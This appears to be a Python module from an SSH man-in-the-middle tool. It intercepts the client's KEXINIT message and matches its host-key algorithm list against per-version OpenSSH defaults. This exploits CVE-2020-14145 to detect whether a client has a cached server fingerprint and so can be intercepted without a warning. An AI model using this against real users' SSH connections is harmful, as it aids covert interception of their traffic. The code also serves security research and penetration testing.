import logging
import re

from paramiko import Transport, common, ECDSAKey

DEFAULT_ALGORITMS = [
    [  # client version: OpenSSH_8.2p1 - OpenSSH_8.4p1++
        'ecdsa-sha2-nistp256-cert-v01@openssh.com', 'ecdsa-sha2-nistp384-cert-v01@openssh.com',
        'ecdsa-sha2-nistp521-cert-v01@openssh.com', 'sk-ecdsa-sha2-nistp256-cert-v01@openssh.com',
        'ssh-ed25519-cert-v01@openssh.com', 'sk-ssh-ed25519-cert-v01@openssh.com',
        'rsa-sha2-512-cert-v01@openssh.com', 'rsa-sha2-256-cert-v01@openssh.com',
        'ssh-rsa-cert-v01@openssh.com', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384',
        'ecdsa-sha2-nistp521', 'sk-ecdsa-sha2-nistp256@openssh.com', 'ssh-ed25519',
        'sk-ssh-ed25519@openssh.com', 'rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa'
    ],
    [  # client version: OpenSSH_7.8p1 - OpenSSH_8.1p1++
        'ecdsa-sha2-nistp256-cert-v01@openssh.com', 'ecdsa-sha2-nistp384-cert-v01@openssh.com',
        'ecdsa-sha2-nistp521-cert-v01@openssh.com', 'ssh-ed25519-cert-v01@openssh.com',
        'rsa-sha2-512-cert-v01@openssh.com', 'rsa-sha2-256-cert-v01@openssh.com',
        'ssh-rsa-cert-v01@openssh.com', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384',
        'ecdsa-sha2-nistp521', 'ssh-ed25519', 'rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa'
    ],
    [  # client version: OpenSSH_7.2p1 - OpenSSH_7.7p1 Ubuntu-4ubuntu0.3, OpenSSL 1.0.2n  7 Dec 2017
        'ecdsa-sha2-nistp256-cert-v01@openssh.com', 'ecdsa-sha2-nistp384-cert-v01@openssh.com',
        'ecdsa-sha2-nistp521-cert-v01@openssh.com', 'ssh-ed25519-cert-v01@openssh.com',
        'ssh-rsa-cert-v01@openssh.com', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384',
        'ecdsa-sha2-nistp521', 'ssh-ed25519', 'rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa'
    ],
    [  # client version: OpenSSH_7.0p1 - OpenSSH_7.1p2
        'ecdsa-sha2-nistp256-cert-v01@openssh.com', 'ecdsa-sha2-nistp384-cert-v01@openssh.com',
        'ecdsa-sha2-nistp521-cert-v01@openssh.com', 'ssh-ed25519-cert-v01@openssh.com',
        'ssh-rsa-cert-v01@openssh.com', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384',
        'ecdsa-sha2-nistp521', 'ssh-ed25519', 'ssh-rsa'
    ],
    [  # client version: OpenSSH_6.5p1 - OpenSSH_6.9p1
        'ecdsa-sha2-nistp256-cert-v01@openssh.com', 'ecdsa-sha2-nistp384-cert-v01@openssh.com',
        'ecdsa-sha2-nistp521-cert-v01@openssh.com', 'ssh-ed25519-cert-v01@openssh.com',
        'ssh-rsa-cert-v01@openssh.com', 'ssh-dss-cert-v01@openssh.com', 'ssh-rsa-cert-v00@openssh.com',
        'ssh-dss-cert-v00@openssh.com', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384', 'ecdsa-sha2-nistp521',
        'ssh-ed25519', 'ssh-rsa', 'ssh-dss'
    ],
    [  # client version: OpenSSH_6.0p1 - OpenSSH_6.4p1
        'ecdsa-sha2-nistp256-cert-v01@openssh.com', 'ecdsa-sha2-nistp384-cert-v01@openssh.com',
        'ecdsa-sha2-nistp521-cert-v01@openssh.com', 'ssh-rsa-cert-v01@openssh.com', 'ssh-dss-cert-v01@openssh.com',
        'ssh-rsa-cert-v00@openssh.com', 'ssh-dss-cert-v00@openssh.com', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384',
        'ecdsa-sha2-nistp521', 'ssh-rsa', 'ssh-dss'
    ]
]


def hookup_cve_2020_14145(session):
    # When really trying to implement connection accepting/forwarding based on CVE-14145
    # one should consider that clients who already accepted the fingerprint of the ssh-mitm server
    # will be connected through on their second connect and will get a changed keys error
    # (because they have a cached fingerprint and it looks like they need to be connected through)
    def intercept_key_negotiation(transport, m):
        # restore intercept, to not disturb re-keying if this significantly alters the connection
        transport._handler_table[common.MSG_KEXINIT] = Transport._negotiate_keys

        m.get_bytes(16)  # cookie, discarded
        m.get_list()  # key_algo_list, discarded
        server_key_algo_list = m.get_list()
        logging.debug("CVE-2020-14145: client algorithms: %s", server_key_algo_list)
        for host_key_algo in DEFAULT_ALGORITMS:
            if server_key_algo_list == host_key_algo:
                logging.info("CVE-2020-14145: Client connecting for the FIRST time!")
                break
        else:
            logging.info("CVE-2020-14145: Client has a locally cached remote fingerprint!")
        if "openssh" in session.transport.remote_version.lower():
            if isinstance(session.proxyserver.host_key, ECDSAKey):
                logging.warning("CVE-2020-14145: ecdsa-sha2 key is a bad choice; this will produce more false "
                                "positives!")
            r = re.compile(r".*openssh_(\d\.\d).*", re.IGNORECASE)
            if int(r.match(session.transport.remote_version).group(1).replace(".", "")) > 83:
                logging.warning("CVE-2020-14145: Remote OpenSSH Version > 8.3; CVE-2020-14145 might produce false "
                                "positive!")

        m.rewind()
        # normal operation
        Transport._negotiate_keys(transport, m)

    session.transport._handler_table[common.MSG_KEXINIT] = intercept_key_negotiation
